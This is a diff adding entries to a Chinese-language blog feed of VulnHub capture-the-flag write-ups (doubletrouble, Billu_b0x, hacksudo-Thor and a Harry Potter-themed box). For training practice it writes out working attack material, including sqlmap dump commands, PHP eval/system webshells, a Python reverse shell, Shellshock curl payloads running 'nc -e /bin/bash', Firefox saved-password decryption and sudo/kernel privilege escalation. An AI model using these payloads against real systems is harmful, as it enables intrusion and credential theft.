+<p><code>scp id_rsa.pub snape@192.168.3.131:~/</code></p>
+<p>改名为authorized_keys</p>
+<p><code>mv id_rsa.pub authorized_keys</code></p>
+<p>使用su_cp将公钥拷贝到hermoine的.ssh目录下(**给公钥640权限 **      //这里正是因为su_cp有suid权限 如果没这权限 移动不了</p>
+<p>/home/hermoine/bin/su_cp authorized_keys  /home/hermoine/.ssh</p>
+<figure data-type="image" tabindex="21"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191104172.png" alt="image-20240319110401146" loading="lazy"></figure>
+<p>然后kali连接  (密钥对连接   ) 指定文件 -i 去连接</p>
+<p>这里要注意 kali要用 root权限去连接</p>
+<figure data-type="image" tabindex="22"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191034907.png" alt="image-20240319103419864" loading="lazy"></figure>
+<p>注意 这里私钥的权限不要给大了  要给 600</p>
+<figure data-type="image" tabindex="23"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191130187.png" alt="image-20240319113043153" loading="lazy"></figure>
+<h3 id="第三次">第三次</h3>
+<p>这里用到了个没学过的方法 (破解浏览器的遗留密码 然后尝试登入root )</p>
+<p>在hermoine的主目录下有.mozilla的隐藏文件</p>
+<p><strong>.mozilla</strong>是linux使用firefox浏览器所生成的文件，里面有使用firefox浏览器下的拓展、安装等信息，还有记住的某些web系统的账号密码</p>
+<p>使用<strong>scp</strong>将.mozilla传输到kali，使用一款针对firefox浏览器账号密码还原的工具<strong>firefox_decrypt</strong></p>
+<p>工具地址：https://github.com/unode/firefox_decrypt</p>
+<p><code>scp -rp hermoine@192.168.3.131:~/.mozilla /tmp</code></p>
+<figure data-type="image" tabindex="24"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191114537.png" alt="image-20240319111419495" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191134781.png" alt="image-20240319113405737" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191136505.png" alt="image-20240319113634471" loading="lazy"></figure>
+<p><code>python3 firefox_decrypt.py /tmp/.mozilla/firefox</code></p>
+<p>发现个root密码</p>
+<figure data-type="image" tabindex="27"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191139812.png" alt="image-20240319113915776" loading="lazy"></figure>
+<p>尝试去ssh 连接root</p>
+<figure data-type="image" tabindex="28"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191139490.png" alt="image-20240319113952455" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[0x13-VulnHub靶机-doubletrouble]]></title>
+        <id>https://xiaomaoq.github.io/0x13-vulnhub-ba-ji-doubletrouble/</id>
+        <link href="https://xiaomaoq.github.io/0x13-vulnhub-ba-ji-doubletrouble/">
+        </link>
+        <updated>2024-03-15T12:35:08.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="环境">环境</h1>
+<p>靶机: https://download.vulnhub.com/doubletrouble/doubletrouble.ova</p>
+<h2 id="内容">内容</h2>
+<ul>
+<li>
+<p>已知cms的操作  (找已知exp or  看高版本的更新内容</p>
+</li>
+<li>
+<p>隐写术  (StegSeek 工具</p>
+</li>
+<li>
+<p>awk提权(权限配置不当)</p>
+</li>
+<li>
+<p>sql盲注 (sqlmap)   (登录界面)</p>
+</li>
+<li>
+<p>内核提权 (脏牛)</p>
+</li>
+<li>
+<p>判断文件是否相同 看他们两md5sum的值</p>
+</li>
+</ul>
+<h1 id="第一台">第一台</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>常规的主机发现 端口扫描</p>
+<p>发现80端口 有个登录界面  弱口令没结果  sqlmap(这种可以注入的地方得试试) 跑也没结果</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151902502.png" alt="image-20240315190247472" loading="lazy"></figure>
+<p>已知cms了   去官网看看 版本更新了什么 (这些内容往往是修复的漏洞)</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151923778.png" alt="image-20240315192319740" loading="lazy"></figure>
+<p>找去找找exp      这里去kali找找 (这种国外的 )</p>
+<p>这里的exp都是需要账号密码 在后台的</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151927832.png" alt="image-20240315192702787" loading="lazy"></figure>
+<p>继续dirsearch扫     发现 /secret 目录下面有一张照片而且名字也和靶机一样</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151935443.png" alt="image-20240315193542411" loading="lazy"></figure>
+<h2 id="隐写-爆破">隐写 爆破</h2>
+<p>用 steghide看到里面有密码    说明里面肯定有东西</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151938285.png" alt="image-20240315193832262" loading="lazy"></figure>
+<p>StegSeek(高效的密码爆破工具 爆破图片密码     去破解密码<br>
+<code>stegseek --crack mao.jpg rockyou.txt</code></p>
+<p>而且直接把隐写的内容也搞出来   用这个去登80界面的那个登录界面</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151940113.png" alt="image-20240315194043085" loading="lazy"></figure>
+<h2 id="找cms漏洞拿shell">找cms漏洞拿shell</h2>
+<p>成功登入   然后再用exp拿shell   （50175.py  需要改下缩进</p>
+<p>你妹的 少个/都不行  <code>python3 50175.py -url http://192.168.3.125/ -u otisrush@localhost.com -p otis666</code></p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151518837.png" alt="3f98f551b0334847cf02c574e365455" loading="lazy"></figure>
+<p>然后nc 反弹shell</p>
+<h2 id="提权">提权</h2>
+<p>sudo -l  就看到了awk命令不要密码  去https://gtfobins.github.io/找一找利用代码</p>
+<ul>
+<li>
+<pre><code>sudo awk 'BEGIN {system(&quot;/bin/sh&quot;)}'
+</code></pre>
+</li>
+</ul>
+<p>直接得到root</p>
+<p>然后再root目录翻到一个ova格式 还有一台要打</p>
+<p>将靶机文件传出来</p>
+<p>靶机: nc 192.168.3.120 3333 &lt; doubletrouble.ova -w 1    将文件传输给kali的3333端口，-w 1表示传输成功后1s端口连接关闭，这样子就可以看到什么时候传输成功过</p>
+<p>kali: nc -lnvp 3333 &gt; doubletrouble2.ova</p>
+<p>对比文件是否完全相同   看看两个文件的md5sum 是否完全相同</p>
+<h1 id="第二台">第二台</h1>
+<p>把靶机启动起来 常规的主机发现 端口扫描</p>
+<p>就只看到80端口有个登录界面 而且不知道是什么cms啥的   dirsearch也扫不出目录    就去试试 sql注入</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151955648.png" alt="image-20240315195533624" loading="lazy"></figure>
+<h2 id="sql盲注">SQL盲注</h2>
+<p>先 <code>sqlmap -r qwe.txt</code>   跑出来东西了  然后再继续注入</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151957396.png" alt="image-20240315195702358" loading="lazy"></figure>
+<p><code>sqlmap -r qwe.txt --dbs</code>     跑出数据库</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151637067.png" alt="image-20240315163721036" loading="lazy"></figure>
+<p><code>sqlmap -r qwe.txt -D doubletrouble --tables</code>    跑出表</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151641079.png" alt="image-20240315164114054" loading="lazy"></figure>
+<p><code>sqlmap -r qwe.txt -D doubletrouble -T users --columns</code>  跑出列</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151645333.png" alt="image-20240315164522305" loading="lazy"></figure>
+<p><code>sqlmap -r qwe.txt -D doubletrouble -T users -C  username,password  --dump</code>   查数据</p>
+<p>使用 <code>--dump</code> 选项时，sqlmap 将尝试从目标数据库中提取数据</p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151652398.png" alt="image-20240315165248372" loading="lazy"></figure>
+<p>用这个两个登入80端口那个 都进不去</p>
+<p>试试ssh连接  结果真连上了</p>
+<h2 id="提权-2">提权</h2>
+<p>这里可以用内核    脏牛提权：<strong>Linux 内核2.6.22 – 3.9</strong></p>
+<p>https://raw.githubusercontent.com/sqlnetcat/dirtycow-mem/master/dirtycow-mem.c</p>
+<p>gcc -Wall -o dirtycow-mem ww.c -ldl -lpthread</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403151823266.png" alt="image-20240315182309215" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[0x11-VulnHub靶机-Billu_b0x]]></title>
+        <id>https://xiaomaoq.github.io/0x10-vulnhub-ba-ji-billu_b0x/</id>
+        <link href="https://xiaomaoq.github.io/0x10-vulnhub-ba-ji-billu_b0x/">
+        </link>
+        <updated>2024-03-14T06:55:37.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="环境">环境</h1>
+<p>靶机地址:https://download.vulnhub.com/billu/Billu_b0x.zip</p>
+<h2 id="内容">内容</h2>
+<ul>
+<li>
+<p>SQL注入  		 (sqlmap跑不出来 )</p>
+</li>
+<li>
+<p>文件包含                  (会将php代码 解析 执行结果显示给我们)</p>
+</li>
+<li>
+<p>文件上传</p>
+</li>
+<li>
+<p>任意文件下载            (将php源码显示给我们 )</p>
+</li>
+<li>
+<p>内核提权</p>
+</li>
+</ul>
+<p>​</p>
+<h1 id="操作">操作</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>常规的nmap 主机发现 端口扫描   开放22 80</p>
+<p>访问80发现个登录界面 上面写着   但是我用sqlmap去跑 没跑出来诶</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131449196.png" alt="image-20240313144923144" loading="lazy"></figure>
+<p>然后就是目录扫描了  扫出来的东西还挺多</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131450961.png" alt="image-20240313145056925" loading="lazy"></figure>
+<p>add.php 是个上传功能  但是测试了一下  上传图片也没什么变化</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131452394.png" alt="image-20240313145214361" loading="lazy"></figure>
+<p>/in是phpinfo</p>
+<p>/phpmy   是一个数据库的登录界面  弱口令也进不去</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131459114.png" alt="image-20240313145908066" loading="lazy"></figure>
+<p>/test.php     下面的提示看起来可以利用一下   试着去get请求传参发现不行  就改为post</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131503843.png" alt="image-20240313150328816" loading="lazy"></figure>
+<p>更换请求方式  (get post			 要用burp的change request method   而不是直接该抓包的内容 (你直接改 有些细节的变化 导致执行不出原本的结果 )</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131035605.png" alt="image-20240313103532586" loading="lazy"></figure>
+<p>发现用post去传参就可以</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131508600.png" alt="image-20240313150809551" loading="lazy"></figure>
+<h2 id="文件下载与文件包含">文件下载与文件包含</h2>
+<p>我用这种方式去访问 给我回显的是源码     那这应该就是<strong>任意文件下载</strong>   (加上用hackerbar去传参 下载了 )</p>
+<p>文件包含是会将页面解析出来 你可以看到phpinfo的页面 看不到php代码</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131118491.png" alt="image-20240313111810450" loading="lazy"></figure>
+<p>这个时候我们可以看到页面的源码了  知道他的功能是怎么写的  就相当于白盒绕过了</p>
+<h2 id="进入后台-思路一-源码审计">进入后台 思路一   源码审计</h2>
+<p>我们去看看那个登录界面是怎么写的</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131513470.png" alt="image-20240313151319428" loading="lazy"></figure>
+<pre><code>	尝试绕过 然后登录进去 
+	$uname=str_replace('\'','',urldecode($_POST['un']));
+	$pass=str_replace('\'','',urldecode($_POST['ps']));
+	$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
+	$result = mysqli_query($conn, $run);
+	
+	就相当于  
+$run='select * from auth where  pass='.$pass.' and uname='.$uname.'';
+</code></pre>
+<p>uname   ' or 1=1#</p>
+<p>pass     \     (为啥这个要是 \ 啊  md  不理解 )</p>
+<h2 id="进入后台-思路二-进入数据库管理界面">进入后台 思路二    进入数据库管理界面</h2>
+<p>给file继续传参 当传入c.php(dirsearch扫出来的)  发现了数据库的账号密码   通过那个数据库的登录界面登入进去 (没有我们就无法登 因为mysql默认不支持外连)</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131520214.png" alt="image-20240313152031179" loading="lazy"></figure>
+<p>进入后 发现版本了 比较低  去网上找  phpmyadmin 3.4.7后台   但是浅浅试了试 get不了shell</p>
+<p>再去翻一翻有没有什么别敏感信息  发了个账号密码   然后可以直接进入后台</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131535635.png" alt="image-20240313153500602" loading="lazy"></figure>
+<h2 id="思路三">思路三</h2>
+<p><strong>使用sql注入的一些万能密码的payload结合burp进行注入</strong></p>
+<p>因为这个过程需要用到很多的payload，直接显示找到了万能密码的payload文件</p>
+<p><strong>seclists</strong>中的sql的payload文件，<strong>/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt</strong>（对应username）</p>
+<p>burp专业版中自带的针对SQL注入的字典（对应password）</p>
+<h2 id="后台">后台</h2>
+<p>通过找到账号密码 or 万能密码进入后台了</p>
+<p>发现有个上传的点 而且与之前那个add.php  一样</p>
+<p>简单试了 绕不过</p>
+<p>但是这里面的 load 参数就很有意思 他传什么 页面就会发生变化 而且这个参数值都是在dirsearch扫描时候发现有的</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131557076.png" alt="image-20240313155748044" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131558160.png" alt="image-20240313155804125" loading="lazy"></figure>
+<p>我去传入那个in.php发现</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131600088.png" alt="image-20240313160033018" loading="lazy"></figure>
+<p>​	再去试了passwd 也给我显示出来了    确定了这个参数存在文件包含漏洞  (像文件包含 你就看不到php的源码 只可以看到解析出来的页面 <img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131601125.png" alt="image-20240313160129023" loading="lazy"></p>
+<h2 id="文件包含文件上传">文件包含+文件上传</h2>
+<p>这里我们有了文件包含漏洞    而且有上传的功能点   我们可以上传一个带🐎的合法文件  然后再去包含这个文件  由于存在文件包含漏洞 所以这个文件就会以php脚本去解析 然后🐎就生效了</p>
+<p>他会检查文件头</p>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131607853.png" alt="image-20240313160752768" loading="lazy"></figure>
+<p>但是看不到phpinfo的内容(因为我添加GIF89a头部的原因？)    <strong>傻逼了  (肯定不可以直接去访问 要用给参数传参去包含</strong></p>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131608723.png" alt="image-20240313160840693" loading="lazy"></figure>
+<p>应该这样去 <s>但是还是没看到phpinfo的页面？</s></p>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131630968.png" alt="image-20240313163032934" loading="lazy"></figure>
+<p>直接传🐎试试</p>
+<?php
+
+eval($_POST["pass"]);
+
+但这不能够用哥斯拉去连 因为他肯定无法png当php解析  肯定连不上 
+
+![image-20240313161320894](https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131613925.png)
+
+看看能不能执行啥命令什么的  也没显示 
+
+ ![image-20240313164449332](https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131644400.png)
+
+
+
+后面测试测试 发现我写的🐎有点问题 就是我🐎再用post传参就很尴尬 		   这样就可以执行命令而且可以回显 
+
+  <?php
+system($_GET['cmd']); ?>  // 用get 
+<figure data-type="image" tabindex="18"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131654436.png" alt="image-20240313165451371" loading="lazy"></figure>
+<p>然后可以用nc去反弹shell     先kali监听    是能够通的 但是我常规的连不了  试试 nc串联  也不行</p>
+<figure data-type="image" tabindex="19"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131701701.png" alt="image-20240313170123676" loading="lazy"></figure>
+<p>用python的可以    但是要url编码</p>
+<pre><code>export RHOST=&quot;192.168.3.120&quot;;export RPORT=9002;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)'
+
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132128583.png" alt="" loading="lazy"></figure>
+<h2 id="提权">提权</h2>
+<p>suid sudo 都没啥</p>
+<p>uname -a  发现内核版本低</p>
+<figure data-type="image" tabindex="21"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132142474.png" alt="image-20240313214243446" loading="lazy"></figure>
+<p><code>searchsploit 3.13.0</code></p>
+<figure data-type="image" tabindex="22"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132145955.png" alt="image-20240313214554905" loading="lazy"></figure>
+<p>把 文件cp 到桌面  然后再wget下到目标主机</p>
+<p>再编译 <code>gcc 37292.c -o exp</code>  chmod+x exp    再运行</p>
+<figure data-type="image" tabindex="23"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132148553.png" alt="image-20240313214846517" loading="lazy"></figure>
+<h3 id="项目">项目</h3>
+<p>用 https://github.com/carlospolop/PEASS-ng  也直接搞出了这个root的密码</p>
+<figure data-type="image" tabindex="24"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132156560.png" alt="image-20240313215655534" loading="lazy"></figure>
+<p>也提示了可以用这类内核漏洞</p>
+<figure data-type="image" tabindex="25"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132158001.png" alt="image-20240313215837953" loading="lazy"></figure>
+<h1 id="被忽略的点">被忽略的点</h1>
+<p>在可以看任意文件代码的时候，应该把所有的目录都跑一边，然后<strong>每一个文件都去看一看有什么</strong></p>
+<p>在这个靶机中 在phpmy目录下存在着一个文件 直接由root的密码  然后就可以直接通过ssh去连接</p>
+<p>但我压根就没想过要去扫 /phpmy</p>
+<figure data-type="image" tabindex="26"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131546411.png" alt="image-20240313154620368" loading="lazy"></figure>
+<p>直接拿到root啊</p>
+<figure data-type="image" tabindex="27"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131547293.png" alt="image-20240313154734259" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[0x10-VulnHub-hacksudo-Thor]]></title>
+        <id>https://xiaomaoq.github.io/0x10-vulnhub-hacksudo-thor/</id>
+        <link href="https://xiaomaoq.github.io/0x10-vulnhub-hacksudo-thor/">
+        </link>
+        <updated>2024-03-12T14:47:41.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="环境">环境</h1>
+<p>靶机：https://download.vulnhub.com/hacksudo/hacksudo---Thor.zip</p>
+<p>难度：中</p>
+<h2 id="内容">内容</h2>
+<ol>
+<li>开源源码泄露</li>
+<li>CGI</li>
+<li>破壳漏洞   .cgi  .sh</li>
+<li>SUID提权</li>
+</ol>
+<h1 id="操作">操作</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>常规的端口扫描 主机发现      80端口是个登录界面  试了试弱口令 进不去</p>
+<p>再扫一扫目录   发现还有个登录界面   然后在readme.md找到了默认密码 (也可以根据这个文件提供的github地址 去github找源码 看看有什么泄露的东西  这里在文档上面就直接出来了默认账密)</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121718200.png" alt="image-20240312171811159" loading="lazy"></figure>
+<p>添加功能出现了sql语句的报错       但是无法拿到shell</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121726312.png" alt="image-20240312172620282" loading="lazy"></figure>
+<p>这里有四个账号  点击去也可以看到密码</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121917896.png" alt="image-20240312191703860" loading="lazy"></figure>
+<p>还有一种思路   已经获取了这系统的源码  我们可以去翻翻源码里面的sql文件 去看看 有没有初始的用户</p>
+<p>再用提到的账号密码去登录80的那个登陆页面</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121923615.png" alt="image-20240312192307583" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121923113.png" alt="image-20240312192339091" loading="lazy"></figure>
+<p>这个post news 功能存在 xss  但是没啥用</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121749205.png" alt="image-20240312174939172" loading="lazy"></figure>
+<h2 id="业务逻辑漏洞">业务逻辑漏洞</h2>
+<p>用找到的几个默认的用户可以登录进去80的那个后台   zakee94	nafees123        可以看到这个用户有多少钱</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121932828.png" alt="image-20240312193258773" loading="lazy"></figure>
+<p>添加一个用户  然后给这个用户转钱</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121939162.png" alt="image-20240312193922132" loading="lazy"></figure>
+<p>直接用他的登录密码</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121941879.png" alt="image-20240312194100850" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121941022.png" alt="image-20240312194130998" loading="lazy"></figure>
+<p>在admin后台也可看到用户PIN  也可以让用户扣钱</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403121942752.png" alt="image-20240312194211726" loading="lazy"></figure>
+<p>不能够让登录的密码成为支付密码 (但是我发现健身银行就是这样啊哈 )</p>
+<h2 id="cgi">CGI</h2>
+<p>在扫目录的时候 发现了 cgi-bin   一开始是403  但是当我们登录后再去访问 就能够看到页面内容了(没啥可利用的)</p>
+<p><strong>CGI</strong>：通用网关接口（Common Gateway Interface）是一个Web服务器主机提供信息服务的标准接口。通过CGI接口，Web服务器就能够获取客户端提交的信息，转交给服务器端的CGI程序进行处理，最后返回结果给客户端<br>
+<img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122249428.png" alt="image-20240312224912400" loading="lazy"></p>
+<p>进行请求处理的可能是shell脚本</p>
+<p>在cgi-bin这个目录下就会存储很多脚本文件   .cgi    .sh</p>
+<p>于是就用dirsearch 去扫描一下cgi-bin 目录存在哪些文件</p>
+<p><code>python3 dirsearch.py -u http://192.168.3.122/cgi-bin -f -e sh,cgi</code></p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122053189.png" alt="image-20240312205325160" loading="lazy"></figure>
+<p>响应码是500   服务器报错的响应码   说明存在这个文件，只是我们没有提供正确的参数 ，服务器无法处理我们请求</p>
+<p>而这个可能收到破壳漏洞的影响</p>
+<p>在涉及 CGI 的环境中，如果 Web 服务器使用的是 Bash 作为 CGI 脚本的解释器，并且系统受到了破壳漏洞的影响，那么攻击者可能会利用 CGI 程序来触发<strong>破壳漏洞</strong>，进而实现对系统的攻击。通过在 CGI 请求中注入恶意内容，攻击者可以利用破壳漏洞执行任意代码，从而危害系统安全</p>
+<h2 id="破壳漏洞">破壳漏洞</h2>
+<p>破壳漏洞(shell)，利用整个web应用的软件架构中的一部分可以执行代码的软件组件，通过这种漏洞来实现代码执行，反弹shell等操作</p>
+<p>破壳漏洞所利用的就是shell的bash类型</p>
+<p>根本原因：由于bash解析环境变量当中引用的函数定义的时候，它的过滤和函数定义的界限区分不清晰，而造成了这个漏洞**</p>
+<p>如果web应用使用了cgi技术，通过外部程序的引用，引用了操作系统的bash来处理一些指令的话，那么就可以把http服务作为访问操作系统shell的通道，向操作系统shell，提交环境变量定义，环境变量定义当中，又引入其他的函数定义，实现目标的手段</p>
+<p>判断和利用：</p>
+<p>去寻找<strong>web程序下/cgi-bin下是否存在cgi，sh的文件，<strong>如果存在，那么就意味着这个</strong>web应用程序所引用</strong>的<strong>外部应用程序</strong>就是<strong>操作系统的shell</strong></p>
+<p>条件：操作系统使用的是<strong>bash并且版本老</strong></p>
+<p>如果存在cgi或者sh后缀的话，使用nmap进行<strong>判断</strong>是否有破壳漏洞</p>
+<p>检测</p>
+<p><code>nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 192.168.3.122</code></p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122109411.png" alt="image-20240312210906369" loading="lazy"></figure>
+<p>使用curl进行进一步探测，自定义一个ua头，然后再u头中自定义一个函数，然后输入操作系统的指令，并查询是否存在nc</p>
+<p><code>curl -H &quot;user-agent: () { : ; }; echo; echo; /bin/bash -c ' which nc '&quot; \http://192.168.3.122/cgi-bin/shell.sh</code></p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122109505.png" alt="image-20240312210938476" loading="lazy"></figure>
+<p>反弹shell</p>
+<p><code>curl -H &quot;user-agent: () { : ; }; echo; echo; /bin/bash -c ' nc -e /bin/bash 192.168.3.120 3333 '&quot; \http://192.168.3.122/cgi-bin/shell.sh</code></p>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122111314.png" alt="image-20240312211108284" loading="lazy"></figure>
+<h2 id="提权">提权</h2>
+<p>这条 sudo 配置的含义是允许用户 www-data 在主机 HackSudoThor 上以 <strong>thor 用户的身份</strong>执行 <code>/home/thor/./hammer.sh</code> 这个命令，并且在执行时不需要输入密码  并不是以root</p>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122201939.png" alt="image-20240312220136911" loading="lazy"></figure>
+<p>但是你直接去这样执行</p>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122202882.png" alt="image-20240312220243861" loading="lazy"></figure>
+<p>需要这样   指定thor用户</p>
+<p><code>sudo -u thor /home/thor/./hammer.sh</code></p>
+<p>再通过这个应用的一些操作  拿到了 thor的shell</p>
+<figure data-type="image" tabindex="18"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122211117.png" alt="image-20240312221126087" loading="lazy"></figure>
+<p>爆破出来目录里面的id_rsa    再结合user里面的  试试可不可以登录   但是这个思路不对诶</p>
+<figure data-type="image" tabindex="19"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122218695.png" alt="image-20240312221841644" loading="lazy"></figure>
+<p>还没看看有没有suid   sudo -l (切换个用户就要重新看看 这个用户有没有配置错误</p>
+<figure data-type="image" tabindex="20"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122226667.png" alt="image-20240312222648631" loading="lazy"></figure>
+<p>去找 https://gtfobins.github.io/gtfobins/service/</p>
+<p><code>sudo service ../../bin/sh</code></p>
+<figure data-type="image" tabindex="21"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403122233948.png" alt="image-20240312223352910" loading="lazy"></figure>
+<p>也可以用  sudo cat /etc/shadow 的root密码 然后破解密码</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Linux提权小结]]></title>
+        <id>https://xiaomaoq.github.io/linux-ti-quan-xiao-jie/</id>
+        <link href="https://xiaomaoq.github.io/linux-ti-quan-xiao-jie/">
